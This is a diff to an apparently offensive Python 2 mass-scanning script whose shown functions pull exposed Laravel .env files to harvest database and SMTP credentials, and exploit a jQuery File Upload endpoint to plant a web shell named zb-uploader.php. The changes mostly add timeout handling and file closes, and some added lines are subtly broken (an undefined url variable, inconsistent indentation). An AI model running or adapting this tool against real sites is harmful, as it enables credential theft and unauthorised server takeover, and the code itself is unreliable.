@@ -47,22 +47,25 @@ def LeNv():
 	fs.sort()
 	for site in fs:
 		print bcolors.NORMAL
-		eNv = "{}/.env".format(site)
-		r = requests.get(eNv, timeout=5)
-		rel = r.text
-		print "Try it => {}".format(site)
-		if "APP_ENV" in rel:
-			print(bcolors.HIJAU + " [OK] Laravel")
-			if "malitrap.io" in rel:
-				print "  DATABASE [OK]"
-				print "  SMTPS [BAD]"
+		try:
+			requests.post(site, headers, timeout=10)
+			eNv = "{}/.env".format(site)
+			r = requests.get(eNv, timeout=5)
+			rel = r.text
+			print "Try it => {}".format(site)
+			if "APP_ENV" in rel:
+				print(bcolors.HIJAU + " [OK] Laravel")
+				if "malitrap.io" in rel:
+					print "  DATABASE [OK]"
+					print "  SMTPS [BAD]"
+				else:
+					print "  DATABASE [OK]"
+					print "  SMTPS [OK]"
+					lw.write(r.url + "\n")
 			else:
-				print "  DATABASE [OK]"
-				print "  SMTPS [OK]"
-				lw.write(r.url + "\n")
-		else:
-			print(bcolors.MERAH + " [BAD] Laravel")
-
+				print(bcolors.MERAH + " [BAD] Laravel")
+		except requests.exceptions.Timeout:
+			print "Timeout occurred"
 	print bcolors.NORMAL
 	lw.close()
 
@@ -120,17 +123,24 @@ def jQuL():
 	js = open(jl, "r").read().split()
 	js.sort()
 	for site in js:
-		print bcolors.NORMAL
-		print "Try it => {}".format(site)
-		r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
-		rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
-		rjq = rc.text
-		if "ZeroByte.ID" in rjq:
-			print(bcolors.HIJAU + " [OK] Upload Done")
-			print " Your access shell : {}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site)
-			jw.write(site + "/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php\n")
-		else:
-			print(bcolors.MERAH + " [BAD] Upload Failed")
+		try:
+			print bcolors.NORMAL
+			requests.post(url, headers, timeout=10)
+			print "Try it => {}".format(site)
+			r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
+			rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
+			rjq = rc.text
+			if "ZeroByte.ID" in rjq:
+				print(bcolors.HIJAU + " [OK] Upload Done")
+				print " Your access shell : {}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site)
+				jw.write(site + "/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php\n")
+			else:
+				print(bcolors.MERAH + " [BAD] Upload Failed")
+		except requests.exceptions.Timeout:
+  			print "Timeout occurred"
+  	print bcolors.NORMAL
+  	jw.close()
+
 def wPI():
 	print "           ____  ____           __        ____"
 	print " _      __/ __ \/  _/___  _____/ /_____ _/ / /"
@@ -157,6 +167,7 @@ def wPI():
 				print(bcolors.MERAH + " [BAD] {}{}".format(site, patchw[i]))
 			i += 1
 	print bcolors.NORMAL
+	ww.close()
 
 print " 1. LaraveL Environmet List [DB & SMTP]"
 print " 2. Reverse IP [API Hacker Target]"
